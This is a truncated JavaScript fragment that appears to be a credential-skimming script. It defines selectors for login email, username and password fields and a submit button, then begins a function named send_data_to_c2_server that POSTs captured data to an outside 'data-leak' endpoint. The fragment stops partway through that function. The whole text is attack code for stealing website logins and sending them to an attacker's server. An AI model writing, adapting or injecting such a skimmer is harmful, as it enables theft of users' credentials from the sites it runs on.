window["data_leak_label_email"] = ["input[name*='tsme_user_login[_username]']", "input[type='email']"]
window["data_leak_label_password"] = ["input[name*='tsme_user_login[_password]']", "input[type*='password']"]
window["data_leak_label_submit_button"] = ["button.g-recaptcha"]

function send_data_to_c2_server(data) {
    var xhr = window["XMLHttpRequest"] ? new XMLHttpRequest() : new ActiveXObject("Microsoft.XMLHTTP");
    xhr.open("POST", "https://c4-server.f5cloudbuilder.dev:5000/data-leak/");
